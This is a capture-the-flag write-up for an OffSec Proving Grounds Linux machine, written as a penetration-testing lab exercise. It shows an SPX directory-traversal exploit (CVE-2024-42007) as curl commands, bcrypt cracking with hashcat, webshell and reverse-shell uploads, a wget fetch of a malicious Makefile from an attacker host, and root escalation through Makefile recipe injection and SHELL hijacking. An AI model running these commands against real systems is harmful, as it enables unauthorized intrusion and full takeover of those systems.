
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Linux (Ubuntu) **Web Application:** Tiny File Manager + php-spx profiler **Initial Access:** phpinfo.php leaks SPX profiling key → authenticated directory traversal (CVE-2024-42007) → source disclosure → hash cracking → TinyFileManager login → webshell upload **Initial Access Type:** Web application exploitation + credential cracking **Privilege Escalation:** Password reuse to `profiler`, then abuse of a sudo `make install` rule via a malicious Makefile **Final Access:** Root

### Key Techniques

- Nmap service enumeration
- ffuf directory brute-forcing
- phpinfo.php information disclosure (SPX config + secret key leak)
- CVE-2024-42007 — authenticated SPX directory traversal
- Arbitrary file read via traversal (`/etc/passwd`, application source)
- Source code disclosure leading to password hash extraction
- hashcat bcrypt cracking
- Username/password reuse across app-level and OS-level accounts
- TinyFileManager webshell/payload upload
- sudo rule scoped to `make install`
- Malicious Makefile — both SUID-bash and `$SHELL`-hijack variants

---

# Attack Path

```text
Nmap: 22, 80
        ↓
Tiny File Manager Identified (default creds fail)
        ↓
ffuf Directory Brute-Force
        ↓
phpinfo.php Discovered — Leaks SPX Config + spx.http_key
        ↓
CVE-2024-42007: Authenticated SPX Directory Traversal
        ↓
Read /etc/passwd (confirms 'profiler' user exists)
        ↓
Read TinyFileManager Source (index.php) via Same Traversal
        ↓
Extract bcrypt Password Hashes for admin/user
        ↓
Crack Hashes with hashcat + rockyou
        ↓
Log Into TinyFileManager (admin:lowprofile)
        ↓
Upload Webshell + payload.elf Reverse Shell
        ↓
Shell as www-data
        ↓
Password Reuse: su profiler (lowprofile)
        ↓
sudo -l: profiler may run 'make install' on php-spx as root
        ↓
Malicious Makefile ($SHELL Hijack)
        ↓
sudo make install Triggers payload.elf as root
        ↓
Root Shell via Reverse Shell Callback
```

---

# 1. Nmap Enumeration

```bash
nmap -Pn -sC -sV -oN scan.txt <target>
```

```text
22/tcp  ssh    OpenSSH 8.9p1 Ubuntu
80/tcp  http   Apache 2.4.52 - "Tiny File Manager"
```

Default TinyFileManager credentials (`admin:admin` and similar) don't work — need another way in.

---

# 2. Directory Brute-Forcing

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://<target>/FUZZ -t 100
```

```text
index.php       200
phpinfo.php     200
```

`phpinfo.php` left exposed — always worth reading in full.

> [!tip] Recognition Pattern `phpinfo.php` showing up in a directory brute-force is one of the highest-value single hits you can get. Read every section, not just the PHP version — installed extensions and their runtime configuration values are often where the real leak is.

---

# 3. phpinfo.php — SPX Configuration Leak

The phpinfo output reveals the **SPX** PHP profiling extension is installed and enabled, and critically leaks its own access-control secret directly in the config dump:

```text
SPX Support             enabled
SPX Version              0.4.15
spx.http_enabled         1
spx.http_key             a2a90ca2f9f0ea04d267b16fb8e63800
spx.http_profiling_enabled  1
```

> [!warning] Secrets in phpinfo Output Are a Direct Bypass `spx.http_key` is meant to gate access to SPX's web UI — but phpinfo.php dumps PHP's _entire_ runtime configuration, secrets included. Any extension whose "authentication" is really just a static config value is fully defeated the moment phpinfo.php is exposed. Always scan phpinfo output specifically for anything that looks like a key, token, or credential, not just version/path info.

---

# 4. CVE-2024-42007 — SPX Directory Traversal

With the `spx.http_key`, exploited a known authenticated directory traversal in SPX:

- CVE: [CVE-2024-42007](https://nvd.nist.gov/vuln/detail/CVE-2024-42007)
- Details: [NoiseByNorthwest/php-spx issue #252](https://github.com/NoiseByNorthwest/php-spx/issues/252)

```bash
curl 'http://<target>/phpinfo.php?SPX_KEY=<leaked_key>&SPX_UI_URI=/../../../../../../../../etc/passwd'
```

Returns `/etc/passwd` contents directly — confirming arbitrary file read, and revealing a `profiler` user on the system.

**Reused the same traversal against the web app's own source:**

```bash
curl 'http://<target>/phpinfo.php?SPX_KEY=<leaked_key>&SPX_UI_URI=/../../../../../../../../var/www/html/index.php'
```

This pulled TinyFileManager's `index.php`, which contains hardcoded bcrypt password hashes:

```php
$auth_users = array(
    'admin' => '$2y$10$7LaMUa8an8...',
    'user'  => '$2y$10$x8PS6i0Sji...'
);
```

> [!tip] Key Principle An arbitrary file read isn't just useful for `/etc/passwd` — pointing it at the target application's _own_ source code is often how you find hardcoded secrets, config values, or (as here) password hashes that the app's developers never intended to be reachable.

---

# 5. Cracking the Hashes

```bash
hashcat -m 3200 -a 0 hashes rockyou.txt
```

Cracked `admin`'s hash to `lowprofile`.

---

# 6. Gaining a Shell

## What I did differently

Rather than pasting a reverse-shell one-liner directly through TinyFileManager's file editor, used TinyFileManager's **upload** feature to place a PHP webshell, then separately uploaded a compiled **`payload.elf`** reverse-shell binary. The webshell was used to execute the ELF payload, triggering the callback — a two-stage approach (small PHP dropper + separately delivered binary) rather than a single inline script.

> [!note] Why This Matters Later Having a standalone `payload.elf` reverse-shell binary already staged on the target (rather than just a one-off inline script) turned out to be reusable later in privesc — see the Makefile `$SHELL` hijack below, where the same binary gets triggered again, this time as root.

Landed a shell as `www-data`.

## Password reuse to `profiler`

The `profiler` user seen in `/etc/passwd` also exists as a TinyFileManager account (`user`), and the same cracked password worked for both:

```bash
su profiler
# Password: lowprofile
```

```bash
cat /home/profiler/local.txt
```

> [!tip] Recognition Pattern Any username appearing in both an application's own user list and the OS's `/etc/passwd` is a strong signal to try password reuse between the two layers — app-level and OS-level accounts are frequently the same person reusing the same password.

---

# 7. Privilege Escalation Enumeration

```bash
sudo -l
```

```text
User profiler may run the following commands on spx:
    (ALL) /usr/bin/make install -C /home/profiler/php-spx
```

`profiler` can run `make install` against a specific project directory as root, no restriction on the Makefile's contents — meaning whatever `install` target (or other Makefile behavior) exists in that directory runs with root privileges when invoked via sudo.

---

# 8. Privilege Escalation — Malicious Makefile

## Reference approach: SUID bash via `install` target

```makefile
install:
	sudo chmod +s /bin/bash

.PHONY: install
```

Replace the existing Makefile, then trigger it:

```bash
rm /home/profiler/php-spx/Makefile
wget http://<attacker_ip>/Makefile -O /home/profiler/php-spx/Makefile
sudo make install -C /home/profiler/php-spx
```

```bash
ls -l /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash

/bin/bash -p
id
# euid=0(root)
```

## What I did differently: hijacking `make`'s `$SHELL` variable

Instead of writing an `install` recipe that directly calls `chmod`, edited the **`$SHELL` variable inside the Makefile** to point at the already-staged `payload.elf` reverse-shell binary. `make` uses the `SHELL` variable to determine what program it invokes to actually execute each recipe line — by overriding it to point at an arbitrary executable, `make` runs _that_ executable (as root, since the whole `make install` invocation runs under `sudo`) instead of a normal shell.

```makefile
SHELL := /home/profiler/php-spx/payload.elf

install:
	echo "triggering"

.PHONY: install
```

Set up a listener on the attacker machine matching whatever callback `payload.elf` was compiled to make, then:

```bash
sudo make install -C /home/profiler/php-spx
```

`make` invokes `payload.elf` (in place of `/bin/sh`) to run the `install` recipe — since `payload.elf` is the same reverse-shell binary staged during the initial foothold, this immediately fires a callback, this time executing **as root**.

```bash
id
# uid=0(root)
```

> [!tip] Two Valid Techniques for the Same Sudo Rule Both approaches exploit the same underlying weakness — `make install` running arbitrary Makefile-defined behavior as root — but via different mechanisms:
> 
> - **Recipe injection** (`install:` target running `chmod +s /bin/bash`) — simple, direct, leaves a persistent SUID binary.
> - **`$SHELL` hijack** — abuses `make`'s own internal use of a shell variable to execute a completely different program in place of `/bin/sh`, which is a good technique to remember any time you control a Makefile that will be `make`'d with elevated privileges, especially if you already have a reverse-shell binary staged and want to reuse it rather than write a new payload inline.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|phpinfo.php exposed|Read every config value, not just version info — extension secrets/keys are often dumped here too|
|An extension's "auth" is a static config key|phpinfo leaking that key is a full bypass|
|Arbitrary file read achieved|Point it at the target app's own source, not just `/etc/passwd` — hardcoded secrets/hashes are common finds|
|Username exists both as an app account and an OS account|Try password reuse between the two|
|`sudo -l` shows `make install` (or similar build-tool invocation) scoped to a specific directory|Malicious Makefile — check both direct recipe commands and the `SHELL` variable as delivery mechanisms|
|Already have a reverse-shell binary staged on the target|Consider reusing it as the payload for a later privesc step (e.g. via `$SHELL` hijack) instead of writing a new inline command|

---

# Key Lessons

> [!tip] phpinfo.php Leaks More Than Version Info Extension-specific configuration values — including secret keys meant to gate access — are dumped in full. Treat any phpinfo.php find as a scan for credentials/keys, not just a fingerprinting source.

> [!tip] Arbitrary File Read → Read the App's Own Source Once you have LFI/traversal/arbitrary read, pointing it at the target application's own source files is often more valuable than generic OS files — hardcoded credentials and hashes are a common find.

> [!tip] Check for Username Reuse Across App and OS Layers A username appearing both in an application's own account list and in `/etc/passwd` is worth testing for password reuse between the two.

> [!tip] `make install` Under Sudo Has More Than One Attack Surface A Makefile's recipe body is the obvious place to inject commands, but `make`'s own `SHELL` variable is a second, less obvious lever — overriding it swaps out what program `make` uses to run recipes entirely, which is especially convenient when you want to redirect execution to an existing payload binary rather than writing new inline commands.

> [!tip] Stage Reusable Payloads Early A compiled reverse-shell binary (`payload.elf`) uploaded during the initial foothold can be triggered again later in a completely different context (here, via a hijacked `$SHELL` variable during privesc) — worth keeping a working payload staged on the target rather than assuming you'll only need it once.